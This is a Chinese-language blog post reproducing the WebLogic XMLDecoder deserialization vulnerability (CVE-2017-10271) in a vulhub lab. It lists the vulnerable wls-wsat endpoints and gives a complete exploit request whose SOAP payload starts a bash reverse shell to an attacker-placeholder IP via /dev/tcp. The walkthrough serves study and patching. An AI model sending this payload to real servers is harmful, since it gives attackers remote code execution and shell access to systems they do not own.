---
layout: post
title: Weblogic XMLDecoder反序列化漏洞
tags: WebLogic
categories: CVE-2017-10271
---

# Weblogic XMLDecoder反序列化漏洞（CVE-2017-10271）

## 漏洞描述

该漏洞是因为Weblogic的WLS Security组件产⽣了问题，通过WLS Security组件内的servlet映射可以找到出发漏洞的路径CoordinatorPortType（即POC中的路径）。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2017-10271/15927406581132.jpg)

WLS Security组件内的servlet映射共8条

/wls-wsat/CoordinatorPortType

/wls-wsat/RegistrationPortTypeRPC

/wls-wsat/ParticipantPortType

/wls-wsat/RegistrationRequesterPortType

/wls-wsat/CoordinatorPortType11

/wls-wsat/RegistrationPortTypeRPC11

/wls-wsat/ParticipantPortType11

/wls-wsat/RegistrationRequesterPortType11

该漏洞在代码中首先判断我门发送的请求是否为空，如果不为空就取出XML的header部分，然后会将传⼊的xml恶意数据转化为XMLDecoder，对他进⾏ 反序列化后就会代码执⾏。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
部署完成后等待一段时间，访问`http://your-ip:7001/`即可看到一个404页面，说明weblogic已成功启动。

然后发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 部署weblogic机子IP:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/(攻击机IP)/(监听端口） 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

其中请求的地址就是WLS Security组件内的servlet映射，后台接收到我们发送的请求后首先判断是否为空，不为空则获取header部分，即`<soapenv:Header>...</soapenv:Header>`中的内容，由WorkContextXmlInputAdapter对象将传⼊的xml恶意数据转化为XMLDecoder，进行反序列化后就代码执行了。

header部分是xml形式的Java代码，首先是用java.lang中的ProcessBuilder类创建一个操作系统进程，新建一个长度为3的字符串类型的数组写入命令，用start执行。下图是调用一个记事本

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2017-10271/15927428359106.jpg)

攻击机用nc监听，发送上面数据包(bin/bash -c "bash -i >& /dev/tcp/攻击机IP/监听端口 0>&1"，成功获取shell：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2017-10271/15927438802817.jpg)

bash -c "cmd string"，bash使用-c参数会从第一个非选项参数后面的字符串中读取命令；bash -i代表打开⼀个交互式的bash；/dev/tcp/是Linux中的⼀个特殊设备，打开这个⽂件就相当于发出了⼀个socket调⽤，建⽴⼀个socket连接；这里发送数据包中的命令相当于在weblogic主机上打开一个交互式的bash，然后攻击机开启监听，通过/dev/tcp建立socket连接，输出重定向到攻击机的shell上。

## 受影响的版本

10.3.6.0.0
12.1.3.0.0
12.2.1.1.0
12.2.1.2.0

## 参考链接

https://www.anquanke.com/post/id/102768

https://blog.csdn.net/Auuuuuuuu/article/details/89059176